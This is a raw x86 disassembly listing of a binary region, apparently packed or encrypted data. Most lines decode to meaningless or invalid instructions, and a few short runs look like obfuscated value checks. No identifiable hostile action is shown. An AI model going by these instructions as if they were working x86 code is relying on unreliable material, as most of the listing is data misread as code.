  40abfb:	sub    al,BYTE PTR [esi+eiz*4]
  40abfe:	add    BYTE PTR [edx],0x39
  40ac01:	mov    bh,0x3e
  40ac03:	mov    edi,0xbfe9c3cb
  40ac08:	xor    eax,esi
  40ac0a:	stos   BYTE PTR es:[edi],al
  40ac0b:	test   BYTE PTR [eax-0x63c99112],bl
  40ac11:	sbb    DWORD PTR [eax-0x29],eax
  40ac14:	mov    WORD PTR [eax],es
  40ac16:	and    BYTE PTR [edi-0x22],cl
  40ac19:	fadd   st(0),st
  40ac1b:	push   eax
  40ac1c:	push   ebp
  40ac1d:	icebp  
  40ac1e:	(bad)  
  40ac1f:	enter  0xd14e,0x4
  40ac23:	ins    BYTE PTR es:[edi],dx
  40ac24:	leave  
  40ac25:	jne    0x40ac5b
  40ac27:	push   ebx
  40ac28:	mov    ss,esp
  40ac2a:	sbb    al,0xe3
  40ac2c:	cmp    edi,ecx
  40ac2e:	out    dx,al
  40ac2f:	mov    ebp,0xb3ad70a4
  40ac34:	adc    DWORD PTR [eax+0x6acc1dca],ecx
  40ac3a:	jb     0x40abcc
  40ac3c:	xor    esp,DWORD PTR [eax+0x65]
  40ac3f:	lds    ebp,FWORD PTR [edx+0x2643971b]
  40ac45:	jb     0x40ac93
  40ac47:	shl    DWORD PTR [ebx],1
  40ac49:	jmp    0x40ac2a
  40ac4b:	popf   
  40ac4c:	pop    ebx
  40ac4d:	retf   0xa234
  40ac50:	mov    ah,0xfe
  40ac52:	sbb    esi,DWORD PTR [eax-0x72]
  40ac55:	mov    ebx,0xcb195cb5
  40ac5a:	scas   al,BYTE PTR es:[edi]
  40ac5b:	retf   
  40ac5c:	jne    0x40acd9
  40ac5e:	add    edi,DWORD PTR [eax+0x60a8b905]
  40ac64:	mov    edx,0x17ed8d0f
  40ac69:	clc    
  40ac6a:	jae    0x40acd5
  40ac6c:	sub    edi,edx
  40ac6e:	test   ah,al
  40ac70:	add    BYTE PTR [esi+0x46128a9e],bl
  40ac76:	and    bl,BYTE PTR [eax]
  40ac78:	xchg   ebp,eax
  40ac79:	ss das 
  40ac7b:	in     eax,0x95
  40ac7d:	and    al,0x53
  40ac7f:	mov    esp,0xe520b3f8
  40ac84:	dec    esi
  40ac85:	scas   eax,DWORD PTR es:[edi]
  40ac86:	inc    esi
  40ac87:	ror    DWORD PTR [edx+esi*4-0x46],0x44
  40ac8c:	jno    0x40ac2f
  40ac8e:	in     eax,dx
  40ac8f:	es cdq 
  40ac91:	xchg   ebx,eax
  40ac92:	mov    dh,0xee
  40ac94:	add    DWORD PTR [eax],esp
  40ac96:	mov    al,0x91
  40ac98:	xor    bl,BYTE PTR ds:0xd1aec95e
  40ac9e:	retf   0xdde9
  40aca1:	jbe    0x40ac3d
  40aca3:	mov    esp,0x53c3213a
  40aca8:	scas   eax,DWORD PTR es:[edi]
  40aca9:	sbb    edx,ecx
  40acab:	fsubr  DWORD PTR [edx-0x52f72a20]
  40acb1:	jne    0x40ad15
  40acb3:	pop    edi
  40acb4:	xor    edi,edi
  40acb6:	pusha  
  40acb7:	ja     0x40ad36
  40acb9:	pop    es
  40acba:	repz idiv DWORD PTR [edx]
  40acbd:	sbb    BYTE PTR [edx+esi*4-0x454b48c],0xe5
  40acc5:	es xchg edi,eax
  40acc7:	sbb    esp,edx
  40acc9:	mov    ds:0x3a40b8a6,eax
  40acce:	in     al,0xc8
  40acd0:	(bad)  
  40acd1:	aad    0x4b
  40acd3:	adc    bh,ch
  40acd5:	or     eax,0xf04329f0
  40acda:	iret   
  40acdb:	jp     0x40ac66
  40acdd:	mov    esp,0xa930e8f6
  40ace2:	xchg   esi,eax
  40ace3:	inc    esi
  40ace4:	into   
  40ace5:	idiv   DWORD PTR [ecx+0x2e]
  40ace8:	dec    ebx
  40ace9:	push   ebp
  40acea:	mov    bl,0xbb
  40acec:	les    esp,FWORD PTR [eax+0x315b8eae]
  40acf2:	mov    dl,0xac
  40acf4:	push   0x46372951
  40acf9:	scas   al,BYTE PTR es:[edi]
  40acfa:	xor    al,0x42
  40acfc:	fsub   st(0),st
  40acfe:	popf   
  40acff:	or     al,0xd8
  40ad01:	jns    0x40ad23
  40ad03:	push   fs
  40ad05:	enter  0xa509,0xe6
  40ad09:	jle    0x40ad75
  40ad0b:	ins    BYTE PTR es:[edi],dx
  40ad0c:	fcmovnu st,st(4)
  40ad0e:	sub    ch,BYTE PTR [edx+esi*4+0x5a]
  40ad12:	pop    es
  40ad13:	mov    eax,ds:0x9c5c380
  40ad18:	jnp    0x40ad5f
  40ad1a:	jno    0x40acbe
  40ad1c:	add    eax,edx
  40ad1e:	mov    ebx,0xd5709054
  40ad23:	test   al,0xb1
  40ad25:	imul   edi,DWORD PTR [ebx],0x4f
  40ad28:	pop    ss
  40ad29:	das    
  40ad2a:	inc    ebx
  40ad2b:	add    BYTE PTR [edi],dl
  40ad2d:	xor    dh,BYTE PTR [esp+edx*4-0x341daeec]
  40ad34:	fld    DWORD PTR [ebp+0x3ccad02]
  40ad3a:	ror    DWORD PTR [ebx+0x98bf84d],0x8b
  40ad41:	add    al,0x8
  40ad43:	mov    DWORD PTR [ebp-0x1c],eax
  40ad46:	mov    eax,DWORD PTR [ebp+0x8]
  40ad49:	xor    eax,esi
  40ad4b:	add    eax,edi
  40ad4d:	mov    DWORD PTR [ebp-0x20],eax
  40ad50:	mov    eax,DWORD PTR [ebp+0x8]
  40ad53:	mov    ecx,DWORD PTR [ebp-0x1c]
  40ad56:	xor    eax,esi
  40ad58:	add    eax,edi
  40ad5a:	cmp    ecx,eax
  40ad5c:	je     0x40c082
  40ad62:	mov    eax,DWORD PTR [ebp-0x8]
  40ad65:	mov    ecx,DWORD PTR [ebp-0x1c]
  40ad68:	add    ecx,DWORD PTR [eax]
  40ad6a:	mov    DWORD PTR [ebp-0x20],ecx
  40ad6d:	jmp    0x40b08e
  40ad72:	adc    edx,esi
  40ad74:	inc    ebx
  40ad75:	sahf   
  40ad76:	popa   
  40ad77:	scas   eax,DWORD PTR es:[edi]
  40ad78:	icebp  
  40ad79:	jno    0x40adf2
  40ad7b:	ficomp WORD PTR [edi+0x1ea7bbc7]
  40ad81:	inc    edx
  40ad82:	add    bl,dh
  40ad84:	jle    0x40ae04
  40ad86:	jp     0x40ae05
  40ad88:	jle    0x40ae08
  40ad8a:	test   ebx,eax
  40ad8c:	adc    eax,0x786e443d
  40ad91:	dec    edi
  40ad92:	loopne 0x40adfb
  40ad94:	out    dx,al
  40ad95:	xlat   BYTE PTR ds:[ebx]
  40ad96:	push   0x0
  40ad98:	in     eax,dx
  40ad99:	xchg   ecx,eax
  40ad9a:	int    0x25
  40ad9c:	clc    
  40ad9d:	push   esi
  40ad9e:	test   DWORD PTR [esp+esi*2],esi
  40ada1:	call   FWORD PTR [eax*4+0x553cdb]
  40ada8:	cmc    
  40ada9:	jecxz  0x40ae05
  40adab:	stos   BYTE PTR es:[edi],al
  40adac:	js     0x40add4
  40adae:	std    
  40adaf:	sub    ebp,0x7d
  40adb2:	imul   edi,edx,0xffffffb2
  40adb5:	push   0x3178c7a5
  40adba:	mov    ds:0x47153027,eax
  40adbf:	push   ebx
  40adc0:	idiv   BYTE PTR [ecx+0x38]
  40adc3:	inc    ecx
  40adc4:	xor    bl,0xbc
  40adc7:	sbb    BYTE PTR [esi+ebx*4+0x35f5cfe3],dh
  40adce:	push   0x26057fa
  40add3:	imul   ebx,DWORD PTR [esi+0x56],0x16eb3af4
  40adda:	and    BYTE PTR [eax+ecx*4-0x64ab0b76],ch
  40ade1:	call   DWORD PTR [ebp+0x22452db]
  40ade7:	push   DWORD PTR [esi+0x13f6d7cc]
  40aded:	scas   eax,DWORD PTR es:[edi]
  40adee:	cmc    
  40adef:	das    
  40adf0:	shr    DWORD PTR [esi],1
  40adf2:	int    0xff
  40adf4:	cmp    ebx,ebp
  40adf6:	sub    eax,0xa4e065d6
  40adfb:	iret   
  40adfc:	lods   al,BYTE PTR ds:[esi]
  40adfd:	sub    al,BYTE PTR [eax]
  40adff:	or     dh,BYTE PTR [esp+edi*2+0x64c2fb8e]
  40ae06:	xchg   ecx,eax
  40ae07:	add    al,0xe1
  40ae09:	data16 (bad) [edi-0x4a]
  40ae0d:	adc    ebp,edx
  40ae0f:	and    BYTE PTR [ecx+0x0],bh
  40ae12:	fmul   DWORD PTR [ecx+0x49b9771]
  40ae18:	popa   
  40ae19:	mov    al,ds:0x407eb20a
  40ae1e:	dec    edx
  40ae1f:	mov    ch,0x5c
  40ae21:	popa   
  40ae22:	mov    dh,0xe3
  40ae24:	cmp    BYTE PTR [edx+0x44],dh
  40ae27:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ae28:	mov    ebx,0x7275a952
  40ae2d:	mov    bh,0xc6
  40ae2f:	jbe    0x40ae72
  40ae31:	js     0x40ae09
  40ae33:	dec    ebp
  40ae34:	and    eax,0xa3ec0ea6
  40ae39:	jmp    0x69d7:0x421280d4
  40ae40:	sahf   
  40ae41:	inc    ebp
  40ae42:	mov    ch,0xc1
  40ae44:	cmp    eax,0x47c681cc
  40ae49:	lea    ebp,[edi+ecx*1]
  40ae4c:	fwait
  40ae4d:	loop   0x40ae1f
  40ae4f:	hlt    
  40ae50:	arpl   sp,si
  40ae52:	push   ecx
  40ae53:	xchg   ecx,eax
  40ae54:	repnz pop esi
  40ae56:	xchg   ecx,eax
  40ae57:	and    ah,BYTE PTR [ecx-0x19]
  40ae5a:	aaa    
  40ae5b:	add    DWORD PTR [edi-0x6c],ebp
  40ae5e:	or     al,0xce
  40ae60:	js     0x40ae53
  40ae62:	in     eax,dx
  40ae63:	cwde   
  40ae64:	or     ch,0xc4
  40ae67:	push   ebp
  40ae68:	cdq    
  40ae69:	mov    ch,0x15
  40ae6b:	push   ebx
  40ae6c:	adc    dl,ch
  40ae6e:	and    bl,BYTE PTR [eax+0x8]
  40ae71:	sti    
  40ae72:	mov    WORD PTR ds:[ecx+0x79],es
  40ae76:	xlat   BYTE PTR ds:[ebx]
  40ae77:	add    al,0xbd
  40ae79:	jno    0x40aefa
  40ae7b:	push   ds
  40ae7c:	bound  ebp,QWORD PTR fs:[ebx+0x7f18b301]
  40ae83:	pop    es
  40ae84:	cmc    
  40ae85:	mov    dh,BYTE PTR [ecx-0x10]
  40ae88:	in     al,dx
  40ae89:	sbb    ah,ah
  40ae8b:	add    ah,ch
  40ae8d:	cmp    DWORD PTR [edi+0x5b],ebx
  40ae90:	or     BYTE PTR cs:[esi+0x67],bl
  40ae94:	jecxz  0x40aebd
  40ae96:	add    eax,DWORD PTR [ebp+0x4397f2b9]
  40ae9c:	push   ebp
  40ae9d:	jmp    0x6a2e:0xbb8b7a83
  40aea4:	push   0xbe168b04
  40aea9:	ins    DWORD PTR es:[edi],dx
  40aeaa:	shr    DWORD PTR [edi+0x38dfc194],cl
  40aeb0:	aaa    
  40aeb1:	push   esp
  40aeb2:	(bad)  
  40aeb3:	(bad)  
  40aeb5:	popa   
  40aeb6:	or     DWORD PTR [eax],0xb8d1fa54
  40aebc:	fcomi  st,st(4)
  40aebe:	mov    cl,0xb1
  40aec0:	int3   
  40aec1:	cld    
  40aec2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40aec3:	xchg   esi,eax
  40aec4:	or     bh,0x52
  40aec7:	xchg   ebx,eax
  40aec8:	int    0x1
  40aeca:	mov    eax,0x192f7d20
  40aecf:	daa    
  40aed0:	push   esi
  40aed1:	inc    ecx
  40aed2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40aed3:	in     al,dx
  40aed4:	fcomp  QWORD PTR [ebx-0x4f58d05d]
  40aeda:	pop    edx
  40aedb:	dec    ebp
  40aedc:	loope  0x40aeb5
  40aede:	inc    ecx
  40aedf:	fld    DWORD PTR [esi]
  40aee1:	stos   BYTE PTR es:[edi],al
  40aee2:	ror    BYTE PTR [eax],0xf
  40aee5:	cmp    eax,0xd940f0dd
  40aeea:	lahf   
  40aeeb:	je     0x40ae9f
  40aeed:	inc    eax
  40aeee:	dec    eax
  40aeef:	(bad)  
  40aef0:	fcomp  DWORD PTR [esi-0x49]
  40aef3:	sub    dh,BYTE PTR [ecx-0x1d]
  40aef6:	mov    cl,0x8
  40aef8:	sub    eax,0xab8feca7
  40aefd:	jns    0x40af7e
  40aeff:	pop    ss
  40af00:	sar    BYTE PTR [edx-0x53e4defb],cl
  40af06:	div    DWORD PTR [ecx+0x30]
  40af09:	push   cs
  40af0a:	scas   al,BYTE PTR es:[edi]
  40af0b:	sbb    bh,BYTE PTR [ecx]
  40af0d:	not    BYTE PTR [edx+0x444937bd]
  40af13:	stos   BYTE PTR es:[edi],al
  40af14:	mov    edi,0x3ebe9db9
  40af19:	mov    cl,0x9c
  40af1b:	mov    ds:0x7016f272,eax
  40af20:	shl    DWORD PTR [ebp+0x3c59226f],cl
  40af26:	add    DWORD PTR [eax+0x6f],ecx
  40af29:	addr16 cmp al,0xcc
  40af2c:	rcr    esp,cl
  40af2e:	add    bl,dh
  40af30:	sbb    BYTE PTR [eax-0x782dcfc6],dh
  40af36:	dec    ebx
  40af37:	test   BYTE PTR ds:0x2d8bace,0x54
  40af3e:	mov    WORD PTR [edi+0x48d1d826],cs
  40af44:	bnd jb 0x40af3b
  40af47:	rcr    DWORD PTR [eax+0x454d7adc],1
  40af4d:	and    al,0xd6
  40af4f:	push   ds
  40af50:	mov    ds:0x55556d43,al
  40af55:	lds    eax,FWORD PTR [ecx]
  40af57:	pop    es
  40af58:	mov    bl,0x14
  40af5a:	aad    0x26
  40af5c:	popa   
  40af5d:	push   0x73
  40af5f:	sti    
  40af60:	daa    
  40af61:	aad    0x81
  40af63:	pushf  
  40af64:	ins    DWORD PTR es:[edi],dx
  40af65:	or     al,0x17
  40af67:	jmp    DWORD PTR [edi-0x689b1ee8]
  40af6d:	and    esi,0x933b1162
  40af73:	jg     0x40aef7
  40af75:	out    0x7,al
  40af77:	call   0x47dbca5b
  40af7c:	ror    BYTE PTR [ebp+edx*1-0x37],0x69
  40af81:	xchg   edi,eax
  40af82:	mov    dh,0x43
  40af84:	lods   al,BYTE PTR ds:[esi]
  40af85:	fwait
  40af86:	sti    
  40af87:	sbb    al,0x8c
  40af89:	pop    edi
  40af8a:	sub    edx,DWORD PTR [ebx+0x43]
  40af8d:	pop    esi
  40af8e:	sub    al,0xdf
  40af90:	xchg   ebx,eax
  40af91:	scas   al,BYTE PTR es:[edi]
  40af92:	dec    esi
  40af93:	(bad)  
  40af94:	je     0x40af7d
  40af96:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40af97:	test   eax,0xd103f9a
  40af9c:	sbb    eax,DWORD PTR es:[ecx+esi*1+0x360a5657]
  40afa4:	fild   QWORD PTR [edi+0x77]
  40afa7:	stos   DWORD PTR es:[edi],eax
  40afa8:	stc    
  40afa9:	shl    DWORD PTR [edx+0x5922c76d],cl
  40afaf:	inc    ecx
  40afb0:	test   eax,0x9a269454
  40afb5:	pushf  
  40afb6:	mov    DWORD PTR [esi-0x6cb578e2],edx
  40afbc:	mov    dh,0x37
  40afbe:	mov    ch,0xa0
  40afc0:	sti    
  40afc1:	jne    0x40b00c
  40afc3:	mov    ch,0x8
  40afc5:	inc    edx
  40afc6:	pop    esi
  40afc7:	lea    eax,[edi]
  40afc9:	cmp    edi,DWORD PTR [ebx-0x778894e1]
  40afcf:	pop    ecx
  40afd0:	mov    al,0xad
  40afd2:	aas    
  40afd3:	push   ebx
  40afd4:	push   ebx
  40afd5:	outs   dx,DWORD PTR ds:[esi]
  40afd6:	and    eax,0xf5be5add
  40afdb:	fild   DWORD PTR [esi+0x3b40fddc]
  40afe1:	inc    edx
  40afe2:	popf   
  40afe3:	sar    BYTE PTR [eax],1
  40afe5:	jo     0x40b04d
  40afe7:	in     al,0xf6
  40afe9:	mov    esp,0x8bd50ed7
  40afee:	mov    WORD PTR cs:[edi+0x16323a2f],es
  40aff5:	fst    QWORD PTR [ecx+0x28]
  40aff8:	mov    cl,0xb1
  40affa:	mov    DWORD PTR [edx-0x330105ec],ecx
  40b000:	adc    al,0x2d
  40b002:	add    eax,0x585d219a
  40b007:	pop    esp
  40b008:	inc    edx
  40b009:	sbb    ebp,esi
  40b00b:	fld    TBYTE PTR [edx*2-0x4d8a02c3]
  40b012:	(bad)  
  40b013:	retf   
  40b014:	mov    eax,0x8e9c51bb
  40b019:	mov    edx,0x86438402
  40b01e:	jmp    0x5e9:0x62685e77
  40b025:	(bad)  
  40b026:	out    dx,eax
  40b027:	out    0x42,eax
  40b029:	(bad)  
  40b02a:	js     0x40afe7
  40b02c:	xchg   dh,dh
  40b02e:	jl     0x40b06c
  40b030:	loop   0x40b026
  40b032:	mov    ebx,esp
  40b034:	fs stos DWORD PTR es:[edi],eax
  40b036:	daa    
  40b037:	sub    ah,BYTE PTR [eax+ebx*2]
  40b03a:	mov    eax,ds:0x910b2016
  40b03f:	xor    bh,BYTE PTR [ecx-0x60fe35d1]
  40b045:	jno    0x40afec
  40b047:	jge    0x40afde
  40b049:	xor    BYTE PTR [ebp-0x16],ch
  40b04c:	add    BYTE PTR [edi],cl
  40b04e:	lds    esp,FWORD PTR [edx+0x2f]
  40b051:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b052:	pusha  
  40b053:	or     DWORD PTR [ecx],ecx
  40b055:	retf   0x7799
  40b058:	or     BYTE PTR [edi],0xdc
  40b05b:	jle    0x40b07c
  40b05d:	jo     0x40b049
  40b05f:	fmul   DWORD PTR [edx]
  40b061:	push   ss
  40b062:	mov    WORD PTR [edx+0x4f],es
  40b065:	int    0x4d
  40b067:	mov    esi,0xaf9c4608
  40b06c:	test   BYTE PTR [eax-0x782e63b5],bh
  40b072:	jle    0x40b026
  40b074:	mov    esi,0x2496e5d8
  40b079:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b07a:	push   0x396395b2
  40b07f:	fiadd  WORD PTR [ebx+0x7601bb60]
  40b085:	lea    eax,[esp+ebp*4+0x7f]
  40b089:	(bad)  
  40b08a:	retf   0x79d2
  40b08d:	jp     0x40b01a
  40b08f:	inc    ebp
  40b090:	loopne 0x40b01d
  40b092:	dec    ebp
  40b093:	clc    
  40b094:	mov    eax,DWORD PTR [eax+0xc]
  40b097:	mov    ecx,DWORD PTR [ecx]
  40b099:	mov    al,BYTE PTR [eax+ecx*1]
  40b09c:	add    al,0x38
  40b09e:	xor    al,0x46
  40b0a0:	cmp    al,0xc5
  40b0a2:	je     0x40b6fb
  40b0a8:	jmp    0x40b3c9
  40b0ad:	sar    DWORD PTR [ecx],1
  40b0af:	mov    cl,0xa4
  40b0b1:	mov    cl,0x74
  40b0b3:	shr    DWORD PTR [ecx+0x55],1
  40b0b6:	fsubr  DWORD PTR [eax+0x37]
  40b0b9:	enter  0x1119,0xed
  40b0bd:	or     al,0xfe
  40b0bf:	jle    0x40b13f
  40b0c1:	jp     0x40b140
  40b0c3:	jle    0x40b143
  40b0c5:	fst    DWORD PTR [edi-0x3f997d5c]
  40b0cb:	mov    bl,0x4a
  40b0cd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b0ce:	dec    eax
  40b0cf:	(bad)  [ebp-0x5f]
  40b0d2:	xchg   edi,eax
  40b0d3:	sub    edi,DWORD PTR [eax-0x696cb076]
  40b0d9:	lea    esi,[esi+0x68]
  40b0dc:	test   BYTE PTR [ebx],bh
  40b0de:	and    BYTE PTR [eax-0x6bd1d924],ah
  40b0e4:	mov    dl,0xf8
  40b0e6:	(bad)  
  40b0e7:	aad    0x73
  40b0e9:	daa    
  40b0ea:	ins    DWORD PTR es:[edi],dx
  40b0eb:	(bad)  
  40b0ec:	sub    al,0xb
  40b0ee:	mov    esi,0xc2cdc0db
  40b0f3:	(bad)  
  40b0f4:	cmp    dl,BYTE PTR ds:0x389dc3c7
  40b0fa:	lods   eax,DWORD PTR ds:[esi]
  40b0fb:	mov    ah,0xfd
  40b0fd:	lods   al,BYTE PTR ds:[esi]
  40b0fe:	ror    eax,0x59
  40b101:	pop    edx
  40b102:	pop    esp
  40b103:	in     eax,dx
  40b104:	xchg   ebx,eax
  40b105:	sar    DWORD PTR [ebp+0x4c6c696d],1
  40b10b:	mov    ebx,0x2773f418
  40b110:	aas    
  40b111:	fsub   DWORD PTR [edi+eiz*8+0x3f]
  40b115:	or     edi,DWORD PTR [ebx-0x5b49c56d]
  40b11b:	xchg   edi,eax
  40b11c:	sub    eax,0x903481b8
  40b121:	mov    bl,0xc1
  40b123:	or     DWORD PTR [esi+0x22488a70],ebx
  40b129:	cmp    BYTE PTR [edx],dh
  40b12b:	jg     0x40b18f
  40b12d:	loope  0x40b14d
  40b12f:	mov    ss,WORD PTR [esi+0x31]
  40b132:	fldcw  WORD PTR ds:0x8bab37e7
  40b138:	(bad)  
  40b139:	jmp    0x131e:0x3a1b4c82
  40b140:	jmp    0x40b16e
  40b142:	sbb    eax,0xe2ffc6f0
  40b147:	sub    ah,BYTE PTR [ebp+0x62]
  40b14a:	xor    dl,BYTE PTR [eax-0x65]
  40b14d:	add    bh,BYTE PTR ds:0xb503c02
  40b153:	(bad)  [esi]
  40b155:	xor    DWORD PTR [edi+0x253ecc05],eax
  40b15b:	fst    DWORD PTR fs:[ebx+esi*2]
  40b15f:	ss push esi
  40b161:	mov    edx,0x62eb3d52
  40b166:	or     bl,BYTE PTR [edx-0x35cd7936]
  40b16c:	add    eax,0x484f0a69
  40b171:	mov    DWORD PTR [eax+0x30],edi
  40b174:	rol    DWORD PTR [ecx+0x75],cl
  40b177:	xchg   esi,eax
  40b178:	enter  0x9f78,0xcc
  40b17c:	jmp    0x3612925c
  40b181:	push   ecx
  40b182:	mov    ebp,ecx
  40b184:	cmp    al,0x84
  40b186:	int3   
  40b187:	(bad)  
  40b188:	aaa    
  40b189:	in     eax,0x13
  40b18b:	aaa    
  40b18c:	adc    DWORD PTR [ecx+esi*8+0x50bcf67],esp
  40b193:	pop    ss
  40b194:	xor    al,0xeb
  40b196:	push   edx
  40b197:	lock dec edx
  40b199:	mov    ch,0x44
  40b19b:	in     al,0xb2
  40b19d:	sahf   
  40b19e:	jmp    0x519:0x7f8a33f
  40b1a5:	inc    esp
  40b1a6:	mov    cl,0x9c
  40b1a8:	enter  0x68bf,0x93
  40b1ac:	ud0    ebx,esi
  40b1af:	ret    0x4a9
  40b1b2:	sub    eax,0xd4d117c7
  40b1b7:	xlat   BYTE PTR ds:[ebx]
  40b1b8:	xchg   ebp,eax
  40b1b9:	sbb    eax,0x113b2af0
  40b1be:	pusha  
  40b1bf:	jp     0x40b1e6
  40b1c1:	and    eax,0x5d62af55
  40b1c6:	sbb    BYTE PTR [esi-0x37],0x93
  40b1ca:	das    
  40b1cb:	test   edx,edx
  40b1cd:	test   al,0x2a
  40b1cf:	into   
  40b1d0:	pop    ds
  40b1d1:	fidiv  DWORD PTR [ecx]
  40b1d3:	and    DWORD PTR [ebx+0x5a72be27],0x6d
  40b1da:	mov    WORD PTR [edx-0x22],cs
  40b1dd:	mov    ah,ah
  40b1df:	sbb    ch,dh
  40b1e1:	ds pop ebx
  40b1e3:	xor    eax,0x23056368
  40b1e8:	hlt    
  40b1e9:	adc    al,0x19
  40b1eb:	cmp    edx,DWORD PTR [edi]
  40b1ed:	and    BYTE PTR [ebp+0x67],bh
  40b1f0:	cdq    
  40b1f1:	(bad)  
  40b1f2:	or     ebp,esi
  40b1f4:	mov    DWORD PTR [ebx+0x5815f2d5],ebx
  40b1fa:	fsubr  st(3),st
  40b1fc:	push   eax
  40b1fd:	push   eax
  40b1fe:	or     BYTE PTR [eax+0x76d16092],dl
  40b204:	push   es
  40b205:	and    esi,DWORD PTR [ebx-0x18]
  40b208:	xchg   ebx,eax
  40b209:	and    edx,DWORD PTR [edx]
  40b20b:	or     BYTE PTR [ebx+0x70],dl
  40b20e:	pop    ebp
  40b20f:	jae    0x40b1bd
  40b211:	test   al,0x1f
  40b213:	mov    al,ds:0x9e789158
  40b218:	call   0xe310:0x7c990a83
  40b21f:	jne    0x40b272
  40b221:	ins    BYTE PTR es:[edi],dx
  40b222:	inc    eax
  40b223:	popf   
  40b224:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b225:	sar    bl,1
  40b227:	outs   dx,BYTE PTR ds:[esi]
  40b228:	or     al,0xc1
  40b22a:	out    dx,al
  40b22b:	inc    edi
  40b22c:	mov    ah,0x80
  40b22e:	shl    BYTE PTR [esi+0x19],1
  40b231:	cdq    
  40b232:	leave  
  40b233:	or     bl,BYTE PTR [ecx+0xd]
  40b236:	sub    DWORD PTR [ebx-0xfef9fe9],ebx
  40b23c:	jb     0x40b1cc
  40b23e:	fwait
  40b23f:	aad    0x99
  40b241:	mov    bh,0x94
  40b243:	(bad)  
  40b244:	popa   
  40b245:	push   eax
  40b246:	lea    ebp,[ecx]
  40b248:	push   es
  40b249:	(bad)  
  40b24b:	imul   ebx,DWORD PTR ds:[edx],0xffffffb5
  40b24f:	mov    al,ds:0xc66cffb3
  40b254:	sbb    BYTE PTR ds:0x1f50cc10,cl
  40b25a:	bound  eax,QWORD PTR [ebp+ecx*8-0x25e61366]
  40b261:	dec    ebp
  40b262:	(bad)  
  40b263:	into   
  40b264:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b265:	loopne 0x40b2af
  40b267:	add    esp,esp
  40b269:	jmp    0x829e4807
  40b26e:	mul    ebx
  40b270:	test   DWORD PTR [edi+edi*2-0x61],edx
  40b274:	jns    0x40b227
  40b276:	push   esi
  40b277:	idiv   DWORD PTR [esi+0x21123061]
  40b27d:	add    DWORD PTR [ebx+eax*2+0x66],esp
  40b281:	push   0xffffff99
  40b283:	lods   eax,DWORD PTR ds:[esi]
  40b284:	pause  
  40b286:	ret    0x89ab
  40b289:	cmp    dh,BYTE PTR [edx-0x49]
  40b28c:	ds xchg edx,eax
  40b28e:	out    dx,al
  40b28f:	ret    0x183
  40b292:	pop    ecx
  40b293:	imul   ebp,esi,0x9893997f
  40b299:	cs je  0x40b27b
  40b29c:	jge    0x40b266
  40b29e:	xchg   BYTE PTR [edx],ah
  40b2a0:	hlt    
  40b2a1:	adc    al,0x58
  40b2a3:	add    DWORD PTR [eax+ecx*2+0x2a],esp
  40b2a7:	in     eax,0x8d
  40b2a9:	push   ebp
  40b2aa:	cwde   
  40b2ab:	mov    esp,0x9012053c
  40b2b0:	jl     0x40b306
  40b2b2:	xor    ecx,DWORD PTR [esi+edx*4]
  40b2b5:	sub    eax,0x20cd5ee4
  40b2ba:	mov    edi,DWORD PTR [esi+edi*2]
  40b2bd:	ret    
  40b2be:	imul   esp,DWORD PTR [esi-0x28bad900],0x72
  40b2c5:	retf   
  40b2c6:	gs pop eax
  40b2c8:	in     al,dx
  40b2c9:	icebp  
  40b2ca:	mov    dl,0xbb
  40b2cc:	cmp    BYTE PTR [ebp+0x45],dl
  40b2cf:	daa    
  40b2d0:	mov    ebp,0xe397d4d3
  40b2d5:	and    esi,DWORD PTR [ebp-0x67]
  40b2d8:	imul   esi
  40b2da:	xlat   BYTE PTR ds:[ebx]
  40b2db:	cmp    BYTE PTR gs:[eax-0x80],0xf9
  40b2e0:	xor    eax,0xd3dc702b
  40b2e5:	dec    edx
  40b2e6:	dec    edx
  40b2e7:	xor    ah,BYTE PTR [edx-0x7172f581]
  40b2ed:	inc    ecx
  40b2ee:	aam    0x58
  40b2f0:	shl    ebp,1
  40b2f2:	mov    edx,DWORD PTR [edi+0x36faf143]
  40b2f8:	aad    0xa5
  40b2fa:	std    
  40b2fb:	outs   dx,BYTE PTR ds:[esi]
  40b2fc:	(bad)  
  40b2fd:	jne    0x40b335
  40b2ff:	dec    DWORD PTR cs:[edx-0x3c]
  40b303:	xchg   ebx,eax
  40b304:	into   
  40b305:	clc    
  40b306:	mov    ds:0x9db5f010,al
  40b30b:	call   0xbf9cdb03
  40b310:	jne    0x40b29a
  40b312:	xchg   ebp,eax
  40b313:	fwait
  40b314:	leave  
  40b315:	jmp    0x164:0x98ef6a07
  40b31c:	loopne 0x40b383
  40b31e:	lods   eax,DWORD PTR ds:[esi]
  40b31f:	dec    edi
  40b320:	bound  ebp,QWORD PTR [ebx]
  40b322:	aaa    
  40b323:	add    DWORD PTR [esi+eiz*4],ecx
  40b326:	adc    al,0xbb
  40b328:	aam    0x62
  40b32a:	xlat   BYTE PTR ds:[ebx]
  40b32b:	loop   0x40b388
  40b32d:	mov    bh,0xc2
  40b32f:	add    al,ah
  40b331:	inc    ebp
  40b332:	fistp  QWORD PTR [ebx+edi*8]
  40b335:	mov    al,0x6a
  40b337:	dec    edi
  40b338:	fwait
  40b339:	loopne 0x40b33d
  40b33b:	inc    esi
  40b33c:	add    edx,DWORD PTR [edi+ebp*8]
  40b33f:	mov    esp,0xb90ea3ca
  40b344:	popa   
  40b345:	cld    
  40b346:	out    dx,al
  40b347:	adc    bh,BYTE PTR [ebp+0x1aa90cdd]
  40b34d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b34e:	std    
  40b34f:	fld    DWORD PTR [ebx+0x4ffc274a]
  40b355:	enter  0x3ea8,0x68
  40b359:	fld    QWORD PTR ds:0xa7189f99
  40b35f:	cwde   
  40b360:	adc    eax,0x67e62a5
  40b365:	scas   al,BYTE PTR es:[edi]
  40b366:	cmp    BYTE PTR [eax],dh
  40b368:	or     eax,0x318ab896
  40b36d:	fs cwde 
  40b36f:	mov    al,0xd
  40b371:	jae    0x40b354
  40b373:	cli    
  40b374:	mov    al,ds:0x67eb7170
  40b379:	int3   
  40b37a:	and    al,0xaa
  40b37c:	and    al,0xa0
  40b37e:	pushf  
  40b37f:	fldenv [esi]
